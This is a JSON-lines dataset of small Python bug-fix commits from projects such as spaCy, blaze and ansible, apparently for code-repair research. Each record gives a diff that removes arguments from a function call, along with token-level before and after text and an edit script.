{"project": "spaCy", "commit_sha": "2b8c679a3d78996b4fb08f3125ed4787fc779ee2", "parent_sha": "bb781ae7f77d9d36ad7a9d556845e15edd767768", "file_path": "spacy/cli/package.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def package_cli(\n     output_dir: Path = Arg(..., help=\"Output parent directory\", exists=True, file_okay=False),\n     code_paths: str = Opt(\"\", \"--code\", \"-c\", help=\"Comma-separated paths to Python file with additional code (registered functions) to be included in the package\"),\n     meta_path: Optional[Path] = Opt(None, \"--meta-path\", \"--meta\", \"-m\", help=\"Path to meta.json\", exists=True, dir_okay=False),\n-    create_meta: bool = Opt(False, \"--create-meta\", \"-c\", \"-C\", help=\"Create meta.json, even if one exists\"),\n+    create_meta: bool = Opt(False, \"--create-meta\", \"-C\", help=\"Create meta.json, even if one exists\"),\n     name: Optional[str] = Opt(None, \"--name\", \"-n\", help=\"Package name to override meta\"),\n     version: Optional[str] = Opt(None, \"--version\", \"-v\", help=\"Package version to override meta\"),\n     build: str = Opt(\"sdist\", \"--build\", \"-b\", help=\"Comma-separated formats to build: sdist and/or wheel, or none.\"),\n", "before": "create_meta : bool = Opt ( False , \"--create-meta\" , \"-c\" , \"-C\" , help = \"Create meta.json, even if one exists\" ) ,", "after": "create_meta : bool = Opt ( False , \"--create-meta\" , \"-C\" , help = \"Create meta.json, even if one exists\" ) ,", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:\\\"-c\\\"\", 3, 53, 3, 57]], [\"Delete\", [\",:,\", 3, 57, 3, 58]]]"}
{"project": "asv", "commit_sha": "9f236e2c1520ce1d03d8c5bccb7752e1fecb7e95", "parent_sha": "9fb427c8fe5c3da42b13f95c7cbce073f051089d", "file_path": "asv/results.py", "project_url": "https://github.com/TomAugspurger/asv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def find_latest_result_hash(machine, root):\n \n     latest_date = 0\n     latest_hash = ''\n-    for commit_hash, date in iter_existing_hashes(machine, root):\n+    for commit_hash, date in iter_existing_hashes(root):\n         if date > latest_date:\n             latest_date = date\n             latest_hash = commit_hash\n", "before": "for commit_hash , date in iter_existing_hashes ( machine , root ) : if date > latest_date : latest_date = date latest_hash = commit_hash", "after": "for commit_hash , date in iter_existing_hashes ( root ) : if date > latest_date : latest_date = date latest_hash = commit_hash", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:machine\", 3, 51, 3, 58]], [\"Delete\", [\",:,\", 3, 58, 3, 59]]]"}
{"project": "spaCy", "commit_sha": "c013e5996f3aec8fe6813f1af4386637c29114ec", "parent_sha": "8f42f8d305787cb74bf7d85ef16c9cd40b948895", "file_path": "spacy/tests/parser/test_neural_parser.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def arc_eager(vocab):\n \n @pytest.fixture\n def tok2vec():\n-    return Tok2Vec(8, 100, preprocess=doc2feats())\n+    return Tok2Vec(8, 100)\n \n \n @pytest.fixture\n", "before": "return Tok2Vec ( 8 , 100 , preprocess = doc2feats ( ) )", "after": "return Tok2Vec ( 8 , 100 )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 19, 3, 51], [\"):)\", 3, 49, 3, 50], 4], [\"Delete\", [\",:,\", 3, 26, 3, 27]], [\"Delete\", [\"identifier:preprocess\", 3, 28, 3, 38]], [\"Delete\", [\"=:=\", 3, 38, 3, 39]], [\"Delete\", [\"identifier:doc2feats\", 3, 39, 3, 48]], [\"Delete\", [\"(:(\", 3, 48, 3, 49]], [\"Delete\", [\"argument_list\", 3, 48, 3, 50]], [\"Delete\", [\"call\", 3, 39, 3, 50]], [\"Delete\", [\"keyword_argument\", 3, 28, 3, 50]], [\"Delete\", [\"):)\", 3, 50, 3, 51]]]"}
{"project": "anaconda-client", "commit_sha": "0d91d349654a8e2d5d1ddbbb20a8574e958e78fd", "parent_sha": "5a30ef672bdb16c5669892bb59054e9def47b36d", "file_path": "binstar_client/utils/notebook/downloader.py", "project_url": "https://github.com/TomAugspurger/anaconda-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class Downloader(object):\n         self.ensure_location(location)\n         for f in self.list_files():\n             if self.can_download(location, f, force):\n-                self.download(f, location, force)\n+                self.download(f, location)\n \n     def download(self, dist, location):\n", "before": "self . download ( f , location , force )", "after": "self . download ( f , location )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 42, 3, 43]], [\"Delete\", [\"identifier:force\", 3, 44, 3, 49]]]"}
{"project": "blaze", "commit_sha": "a267862ed5a2cea044c9f5df8824f849f4919c11", "parent_sha": "666f0da3cbb95c961898a43898fe79a7469dc85b", "file_path": "blaze/expr/core.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class Expr(object):\n         >>> t = TableSymbol('t', '{id: int32, name: string}')\n         >>> t.leaves()\n         [t]\n-        >>> by(t, t.name, t.id.nunique()).leaves()\n+        >>> by(t.name, t.id.nunique()).leaves()\n         [t]\n \n         >>> v = TableSymbol('v', '{id: int32, city: string}')\n", "before": "by ( t , t . name , t . id . nunique ( ) ) . leaves ( )", "after": "by ( t . name , t . id . nunique ( ) ) . leaves ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:t\", 3, 16, 3, 17]], [\"Delete\", [\",:,\", 3, 17, 3, 18]]]"}
{"project": "blaze", "commit_sha": "560fb69c2cbbab9328e1a97b7c535d70c2cb478b", "parent_sha": "85c843917260dd66b5e7b7490459deea5c7f5f82", "file_path": "blaze/server/tests/test_server.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,7 @@ def iris():\n def test_compute_by_with_summary(iris_server, iris):\n     test = iris_server\n     t = TableSymbol('t', iris.dshape)\n-    expr = by(t, t.species, max=t.petal_length.max(), sum=t.petal_width.sum())\n+    expr = by(t.species, max=t.petal_length.max(), sum=t.petal_width.sum())\n     tree = to_tree(expr)\n     blob = json.dumps({'expr': tree})\n     resp = test.post('/compute/iris.json', data=blob,\n", "before": "expr = by ( t , t . species , max = t . petal_length . max ( ) , sum = t . petal_width . sum ( ) )", "after": "expr = by ( t . species , max = t . petal_length . max ( ) , sum = t . petal_width . sum ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:t\", 3, 15, 3, 16]], [\"Delete\", [\",:,\", 3, 16, 3, 17]]]"}
{"project": "blaze", "commit_sha": "0c61c397fb02162787e1b8b300123c56a09f9d03", "parent_sha": "cb2720863c67971688da4451c03dd9a27922ef70", "file_path": "blaze/expr/tests/test_table.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -697,7 +697,7 @@ def test_leaves():\n \n     assert t.leaves() == [t]\n     assert t.id.leaves() == [t]\n-    assert by(t, t.name, t.id.nunique()).leaves() == [t]\n+    assert by(t.name, t.id.nunique()).leaves() == [t]\n     assert join(t, v).leaves() == [t, v]\n     assert join(v, t).leaves() == [v, t]\n \n", "before": "assert by ( t , t . name , t . id . nunique ( ) ) . leaves ( ) == [ t ]", "after": "assert by ( t . name , t . id . nunique ( ) ) . leaves ( ) == [ t ]", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:t\", 3, 15, 3, 16]], [\"Delete\", [\",:,\", 3, 16, 3, 17]]]"}
{"project": "blaze", "commit_sha": "7a4ec1c6237a7be6d4da9026a1f1bf7786f0b7e3", "parent_sha": "81488ac41c5a06f7c0ebf679b27bd1101d970d89", "file_path": "blaze/api/into.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -619,7 +619,7 @@ def into(coll, d, if_exists=\"replace\", **kwargs):\n \n         copy_cmd = copy_cmd.format(**copy_info)\n         copy_cmd = copy_cmd + ' '.join(optional_flags)\n-        ps = subprocess.Popen(copy_cmd, shell=True, stdout=subprocess.PIPE)\n+        ps = subprocess.Popen(copy_cmd, stdout=subprocess.PIPE)\n         ps.communicate()\n \n         #need to check for date columns and update\n", "before": "ps = subprocess . Popen ( copy_cmd , shell = True , stdout = subprocess . PIPE )", "after": "ps = subprocess . Popen ( copy_cmd , stdout = subprocess . PIPE )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:shell\", 3, 41, 3, 46]], [\"Delete\", [\"=:=\", 3, 46, 3, 47]], [\"Delete\", [\"true:True\", 3, 47, 3, 51]], [\"Delete\", [\"keyword_argument\", 3, 41, 3, 51]], [\"Delete\", [\",:,\", 3, 51, 3, 52]]]"}
{"project": "blaze", "commit_sha": "4f374bfcd5337c547af1f087857ae5199a3620fd", "parent_sha": "2023cde7c6f0086491f12cdd394fe38481c0cce4", "file_path": "blaze/compute/numpy.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ def compute_up(t, x, **kwargs):\n     assert t.axis == tuple(range(ndim(t._child)))\n     result = len(np.unique(x))\n     if t.keepdims:\n-        result = np.array([result], dtype=to_numpy_dtype(t.dshape))\n+        result = np.array([result])\n     return result\n \n \n", "before": "result = np . array ( [ result ] , dtype = to_numpy_dtype ( t . dshape ) )", "after": "result = np . array ( [ result ] )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 26, 3, 68], [\"):)\", 3, 66, 3, 67], 2], [\"Delete\", [\",:,\", 3, 35, 3, 36]], [\"Delete\", [\"identifier:dtype\", 3, 37, 3, 42]], [\"Delete\", [\"=:=\", 3, 42, 3, 43]], [\"Delete\", [\"identifier:to_numpy_dtype\", 3, 43, 3, 57]], [\"Delete\", [\"(:(\", 3, 57, 3, 58]], [\"Delete\", [\"identifier:t\", 3, 58, 3, 59]], [\"Delete\", [\".:.\", 3, 59, 3, 60]], [\"Delete\", [\"identifier:dshape\", 3, 60, 3, 66]], [\"Delete\", [\"attribute\", 3, 58, 3, 66]], [\"Delete\", [\"argument_list\", 3, 57, 3, 67]], [\"Delete\", [\"call\", 3, 43, 3, 67]], [\"Delete\", [\"keyword_argument\", 3, 37, 3, 67]], [\"Delete\", [\"):)\", 3, 67, 3, 68]]]"}
{"project": "dask-kubernetes", "commit_sha": "3ce40e6159f72dc3a63152f7b4238509520dea85", "parent_sha": "ecef1c1199903fde2a8b6f7617deb2e566f33095", "file_path": "dask_kubernetes/tests/test_core.py", "project_url": "https://github.com/TomAugspurger/dask-kubernetes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def ns(api):\n     try:\n         yield name\n     finally:\n-        api.delete_namespace(name, kubernetes.client.V1DeleteOptions())\n+        api.delete_namespace(name)\n \n \n @pytest.fixture\n", "before": "api . delete_namespace ( name , kubernetes . client . V1DeleteOptions ( ) )", "after": "api . delete_namespace ( name )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 29, 3, 72], [\"):)\", 3, 70, 3, 71], 2], [\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"identifier:kubernetes\", 3, 36, 3, 46]], [\"Delete\", [\".:.\", 3, 46, 3, 47]], [\"Delete\", [\"identifier:client\", 3, 47, 3, 53]], [\"Delete\", [\"attribute\", 3, 36, 3, 53]], [\"Delete\", [\".:.\", 3, 53, 3, 54]], [\"Delete\", [\"identifier:V1DeleteOptions\", 3, 54, 3, 69]], [\"Delete\", [\"attribute\", 3, 36, 3, 69]], [\"Delete\", [\"(:(\", 3, 69, 3, 70]], [\"Delete\", [\"argument_list\", 3, 69, 3, 71]], [\"Delete\", [\"call\", 3, 36, 3, 71]], [\"Delete\", [\"):)\", 3, 71, 3, 72]]]"}
{"project": "unknown-horizons", "commit_sha": "a87544053237e0583d37d2c9e963cca45fe0a227", "parent_sha": "2dca040b346d7b3960b630748c23b92f5842a99f", "file_path": "horizons/world/units/collectors/animalcollector.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ class FarmAnimalCollector(AnimalCollector):\n \tdef get_animals_in_range(self, reslist=None):\n \t\t\"\"\"Returns animals from buildings in range\"\"\"\n \t\tcircle = Circle(self.home_building.position.center(), self.home_building.radius)\n-\t\tbuildings = self.home_building.island.get_providers_in_range(circle, reslist=reslist)\n+\t\tbuildings = self.home_building.island.get_providers_in_range(circle)\n \t\tanimals = []\n \t\tfor building in buildings:\n \t\t\tif hasattr(building, 'animals'):\n", "before": "buildings = self . home_building . island . get_providers_in_range ( circle , reslist = reslist )", "after": "buildings = self . home_building . island . get_providers_in_range ( circle )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 70, 3, 71]], [\"Delete\", [\"identifier:reslist\", 3, 72, 3, 79]], [\"Delete\", [\"=:=\", 3, 79, 3, 80]], [\"Delete\", [\"identifier:reslist\", 3, 80, 3, 87]], [\"Delete\", [\"keyword_argument\", 3, 72, 3, 87]]]"}
{"project": "unknown-horizons", "commit_sha": "17f99a1decc48244e938df8bc463883205f6ed98", "parent_sha": "02461ef87a53645c1df2b2a82d652e3c0ceb3333", "file_path": "horizons/command/uioptions.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ GenericComponentCommand.allow_network(AddToSellList)\n class RemoveFromSellList(GenericComponentCommand):\n \t\"\"\"Removes a Resource from sell_list of TradePost\"\"\"\n \tdef __init__(self, tradepost, res_id):\n-\t\tsuper(RemoveFromSellList, self).__init__(tradepost, TradePostComponent.NAME, 'remove_from_sell_list', res_id)\n+\t\tsuper(RemoveFromSellList, self).__init__(tradepost, 'remove_from_sell_list', res_id)\n \n GenericComponentCommand.allow_network(RemoveFromSellList)\n \n", "before": "super ( RemoveFromSellList , self ) . __init__ ( tradepost , TradePostComponent . NAME , 'remove_from_sell_list' , res_id )", "after": "super ( RemoveFromSellList , self ) . __init__ ( tradepost , 'remove_from_sell_list' , res_id )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\",:,\", 3, 78, 3, 79], [\"argument_list\", 3, 43, 3, 112], 5], [\"Delete\", [\"identifier:TradePostComponent\", 3, 55, 3, 73]], [\"Delete\", [\".:.\", 3, 73, 3, 74]], [\"Delete\", [\"identifier:NAME\", 3, 74, 3, 78]], [\"Delete\", [\"attribute\", 3, 55, 3, 78]], [\"Delete\", [\",:,\", 3, 103, 3, 104]]]"}
{"project": "unknown-horizons", "commit_sha": "473895d2fd84fbfc027154699cde73a7b33a8f8d", "parent_sha": "e2ad8b9e8edf8974ccf3870c8de2e66d490db121", "file_path": "horizons/gui/tabs/buyselltab.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -324,7 +324,7 @@ class BuySellTab(TabInterface):\n \t\t\tself.show_resource_menu(widget.parent.id)\n \t\telif event.getButton() == fife.MouseEvent.RIGHT:\n \t\t\t# remove the buy/sell offer\n-\t\t\tself.add_resource(0, widget.parent.id, None, False)\n+\t\t\tself.add_resource(0, widget.parent.id)\n \n \tdef show_resource_menu(self, slot_id):\n", "before": "elif event . getButton ( ) == fife . MouseEvent . RIGHT : self . add_resource ( 0 , widget . parent . id , None , False )", "after": "elif event . getButton ( ) == fife . MouseEvent . RIGHT : self . add_resource ( 0 , widget . parent . id )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 41, 3, 42]], [\"Delete\", [\"none:None\", 3, 43, 3, 47]], [\"Delete\", [\",:,\", 3, 47, 3, 48]], [\"Delete\", [\"false:False\", 3, 49, 3, 54]]]"}
{"project": "unknown-horizons", "commit_sha": "95d82a52a2a112037dde2fce993533f97f6fc0a4", "parent_sha": "534ac25db0ef7d7cb8c8cf93007905943b5786f5", "file_path": "horizons/gui/modules/pausemenu.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class PauseMenu(object):\n \t\tself._ingame_gui = ingame_gui\n \n \t\tname = 'editor_pause_menu.xml' if in_editor_mode else 'ingamemenu.xml'\n-\t\tself._gui = load_uh_widget(name, 'headline')\n+\t\tself._gui = load_uh_widget(name)\n \t\tself._gui.position_technique = 'center:center'\n \n \t\tdef do_load_map():\n", "before": "self . _gui = load_uh_widget ( name , 'headline' )", "after": "self . _gui = load_uh_widget ( name )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"string:'headline'\", 3, 36, 3, 46]]]"}
{"project": "python-graphenelib", "commit_sha": "7321684d8e51648fe5a7fede457ccd3c82b8c8e2", "parent_sha": "3edf300905c43e53446cca3d8a40914e914bf15b", "file_path": "grapheneapi/graphenews.py", "project_url": "https://github.com/blckchnd/python-graphenelib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class GrapheneWebsocket(GrapheneWebsocketRPC):\n     def connect(self) :\n         \"\"\" Create websocket factory by Autobahn\n         \"\"\"\n-        self.factory          = WebSocketClientFactory(self.url, debug=False)\n+        self.factory          = WebSocketClientFactory(self.url)\n         self.factory.protocol = self.proto\n \n     def run_forever(self) :\n", "before": "self . factory = WebSocketClientFactory ( self . url , debug = False )", "after": "self . factory = WebSocketClientFactory ( self . url )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 64, 3, 65]], [\"Delete\", [\"identifier:debug\", 3, 66, 3, 71]], [\"Delete\", [\"=:=\", 3, 71, 3, 72]], [\"Delete\", [\"false:False\", 3, 72, 3, 77]], [\"Delete\", [\"keyword_argument\", 3, 66, 3, 77]]]"}
{"project": "discord-wheatley", "commit_sha": "9f4b0f56289393238050849b1aa195681a720488", "parent_sha": "f3506a6c388de329b26a41c0db65ddb41e4839bd", "file_path": "wheatley.py", "project_url": "https://github.com/itsmehemant123/discord-wheatley", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ class Wheatley:\n \n             corpus_dict['conversations'].append([stim, resp])\n \n-        file_handle.write(yaml.dump(corpus_dict, default_flow_style=False, allow_unicode=False))\n+        file_handle.write(yaml.dump(corpus_dict, default_flow_style=False))\n         file_handle.close()\n \n     async def download_messages(self, channel, limit, is_all, current_count, last_msg, msg_handle):\n", "before": "file_handle . write ( yaml . dump ( corpus_dict , default_flow_style = False , allow_unicode = False ) )", "after": "file_handle . write ( yaml . dump ( corpus_dict , default_flow_style = False ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 74, 3, 75]], [\"Delete\", [\"identifier:allow_unicode\", 3, 76, 3, 89]], [\"Delete\", [\"=:=\", 3, 89, 3, 90]], [\"Delete\", [\"false:False\", 3, 90, 3, 95]], [\"Delete\", [\"keyword_argument\", 3, 76, 3, 95]]]"}
{"project": "gemma-documentregistratiecomponent", "commit_sha": "54702044b0ae48c2d2a4b4bf538653487efe9d67", "parent_sha": "3f06904e825a8e88dffd236be89ee198112f7b56", "file_path": "src/drc/sync/signals.py", "project_url": "https://github.com/VNG-Realisatie/gemma-documentregistratiecomponent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def sync_create(relation: ObjectInformatieObject):\n \n     # figure out which remote resource we need to interact with\n     resource = f\"{relation.object_type}informatieobject\"\n-    client = Client.from_url(relation.object, settings.BASE_DIR)\n+    client = Client.from_url(relation.object)\n \n     pattern = get_operation_url(client.schema, f'{resource}_create', pattern_only=True)\n     # we enforce in the standard that it's a subresource so that we can do this.\n", "before": "client = Client . from_url ( relation . object , settings . BASE_DIR )", "after": "client = Client . from_url ( relation . object )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 45, 3, 46]], [\"Delete\", [\"identifier:settings\", 3, 47, 3, 55]], [\"Delete\", [\".:.\", 3, 55, 3, 56]], [\"Delete\", [\"identifier:BASE_DIR\", 3, 56, 3, 64]], [\"Delete\", [\"attribute\", 3, 47, 3, 64]]]"}
{"project": "autotest-", "commit_sha": "c91a1a0bd01d211d76bee4160b6d5ac22c5e66d8", "parent_sha": "6a9be50d2918c25d55baf81cf1726a7407c51df0", "file_path": "client/virt/tests/iozone_windows.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def run_iozone_windows(test, params, env):\n     c = params.get(\"iozone_cmd\")\n     t = int(params.get(\"iozone_timeout\"))\n     logging.info(\"Running IOzone command on guest, timeout %ss\", t)\n-    results = session.cmd_output(cmd=c, timeout=t, print_func=logging.debug)\n+    results = session.cmd_output(cmd=c, timeout=t)\n     utils.open_write_close(results_path, results)\n \n     # Postprocess the results using the IOzone postprocessing module\n", "before": "results = session . cmd_output ( cmd = c , timeout = t , print_func = logging . debug )", "after": "results = session . cmd_output ( cmd = c , timeout = t )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 50, 3, 51]], [\"Delete\", [\"identifier:print_func\", 3, 52, 3, 62]], [\"Delete\", [\"=:=\", 3, 62, 3, 63]], [\"Delete\", [\"identifier:logging\", 3, 63, 3, 70]], [\"Delete\", [\".:.\", 3, 70, 3, 71]], [\"Delete\", [\"identifier:debug\", 3, 71, 3, 76]], [\"Delete\", [\"attribute\", 3, 63, 3, 76]], [\"Delete\", [\"keyword_argument\", 3, 52, 3, 76]]]"}
{"project": "depmap_analysis", "commit_sha": "45d5f13257a202c949f50f623230bc1947d4e11c", "parent_sha": "a019b1fd6548e2c43a848ea0bb503f430acc4bcf", "file_path": "indra_depmap_service/api.py", "project_url": "https://github.com/indralab/depmap_analysis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ def get_query_page():\n     logger.info(str(request.json))\n     logger.info('------------------------------------')\n \n-    qh = session.get('query', '')\n+    qh = session.get('query')\n     rf = os.path.join(JSON_CACHE, 'result_%s.json' % qh) if qh else False\n     qf = os.path.join(JSON_CACHE, 'query_%s.json' % qh) if qh else False\n     stmt_types = get_queryable_stmt_types()\n", "before": "qh = session . get ( 'query' , '' )", "after": "qh = session . get ( 'query' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 29, 3, 30]], [\"Delete\", [\"string:''\", 3, 31, 3, 33]]]"}
{"project": "ansible-1", "commit_sha": "687aaa197b4a155ce76755c63c6abb9e7c71bfee", "parent_sha": "314f1ea15a14a2361adc4dd7ed2ac6fc9ab0ccb0", "file_path": "lib/ansible/modules/extras/clustering/consul_kv.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -265,7 +265,7 @@ def main():\n         recurse=dict(required=False, type='bool'),\n         retrieve=dict(required=False, default=True),\n         state=dict(default='present', choices=['present', 'absent', 'acquire', 'release']),\n-        token=dict(required=False, default='anonymous', no_log=True),\n+        token=dict(required=False, no_log=True),\n         value=dict(required=False),\n         session=dict(required=False)\n", "before": "token = dict ( required = False , default = 'anonymous' , no_log = True ) ,", "after": "token = dict ( required = False , no_log = True ) ,", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:default\", 3, 36, 3, 43]], [\"Delete\", [\"=:=\", 3, 43, 3, 44]], [\"Delete\", [\"string:'anonymous'\", 3, 44, 3, 55]], [\"Delete\", [\"keyword_argument\", 3, 36, 3, 55]], [\"Delete\", [\",:,\", 3, 55, 3, 56]]]"}
{"project": "ansible-1", "commit_sha": "78347e12a37262a8c30768ef25dc6ad0a9735f1d", "parent_sha": "3d09c4bb4ff40436e7b27de7fa5dffed1708aaeb", "file_path": "lib/ansible/modules/cloud/amazon/ec2_lc.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -394,7 +394,7 @@ def main():\n             classic_link_vpc_security_groups=dict(type='list'),\n             classic_link_vpc_id=dict(),\n             vpc_id=dict(),\n-            placement_tenancy=dict(default='default', choices=['default', 'dedicated'])\n+            placement_tenancy=dict(choices=['default', 'dedicated'])\n         )\n     )\n \n", "before": "placement_tenancy = dict ( default = 'default' , choices = [ 'default' , 'dedicated' ] )", "after": "placement_tenancy = dict ( choices = [ 'default' , 'dedicated' ] )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:default\", 3, 36, 3, 43]], [\"Delete\", [\"=:=\", 3, 43, 3, 44]], [\"Delete\", [\"string:'default'\", 3, 44, 3, 53]], [\"Delete\", [\"keyword_argument\", 3, 36, 3, 53]], [\"Delete\", [\",:,\", 3, 53, 3, 54]]]"}
{"project": "ansible-1", "commit_sha": "91ce5c70d3c29be2fb4127813245e99cd20a8d12", "parent_sha": "fcab13a668acc0b1f810830c29276d9c9ca41ace", "file_path": "lib/ansible/modules/source_control/bzr.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ def main():\n             dest=dict(type='path', required=True),\n             name=dict(type='str', required=True, aliases=['parent']),\n             version=dict(type='str', default='head'),\n-            force=dict(type='bool', default='no', type='bool'),\n+            force=dict(type='bool', default='no'),\n             executable=dict(type='str'),\n         )\n     )\n", "before": "force = dict ( type = 'bool' , default = 'no' , type = 'bool' ) ,", "after": "force = dict ( type = 'bool' , default = 'no' ) ,", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 49, 3, 50]], [\"Delete\", [\"identifier:type\", 3, 51, 3, 55]], [\"Delete\", [\"=:=\", 3, 55, 3, 56]], [\"Delete\", [\"string:'bool'\", 3, 56, 3, 62]], [\"Delete\", [\"keyword_argument\", 3, 51, 3, 62]]]"}
{"project": "ansible-1", "commit_sha": "c30ee42fe1f0a9666a90f4d63121780f2a186c54", "parent_sha": "30cae1c356d7341ef3c3a049b435b2da9bbd5588", "file_path": "lib/ansible/executor/task_executor.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -463,7 +463,7 @@ class TaskExecutor:\n         # if this task is a IncludeRole, we just return now with a success code so the main thread can expand the task list for the given host\n         elif self._task.action == 'include_role':\n             include_variables = self._task.args.copy()\n-            return dict(include_role=self._task, include_variables=include_variables)\n+            return dict(include_variables=include_variables)\n \n         # Now we do final validation on the task, which sets all fields to their final values.\n         self._task.post_validate(templar=templar)\n", "before": "return dict ( include_role = self . _task , include_variables = include_variables )", "after": "return dict ( include_variables = include_variables )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:include_role\", 3, 25, 3, 37]], [\"Delete\", [\"=:=\", 3, 37, 3, 38]], [\"Delete\", [\"identifier:self\", 3, 38, 3, 42]], [\"Delete\", [\".:.\", 3, 42, 3, 43]], [\"Delete\", [\"identifier:_task\", 3, 43, 3, 48]], [\"Delete\", [\"attribute\", 3, 38, 3, 48]], [\"Delete\", [\"keyword_argument\", 3, 25, 3, 48]], [\"Delete\", [\",:,\", 3, 48, 3, 49]]]"}
{"project": "ansible-1", "commit_sha": "3da960720394d3d648b3cc3c15115b2d97fb6b9d", "parent_sha": "91a9564b3bb792a3c0897d8c7a7cb5deb43876d6", "file_path": "lib/ansible/module_utils/eos.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -240,7 +240,7 @@ class Cli:\n             self._module.fail_json(msg='unable to enter configuration mode', output=to_text(err, errors='surrogate_then_replace'))\n \n         if replace:\n-            self.exec_command('rollback clean-config', check_rc=True)\n+            self.exec_command('rollback clean-config')\n \n         rc, out, err = self.send_config(commands)\n         if rc != 0:\n", "before": "self . exec_command ( 'rollback clean-config' , check_rc = True )", "after": "self . exec_command ( 'rollback clean-config' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 54, 3, 55]], [\"Delete\", [\"identifier:check_rc\", 3, 56, 3, 64]], [\"Delete\", [\"=:=\", 3, 64, 3, 65]], [\"Delete\", [\"true:True\", 3, 65, 3, 69]], [\"Delete\", [\"keyword_argument\", 3, 56, 3, 69]]]"}
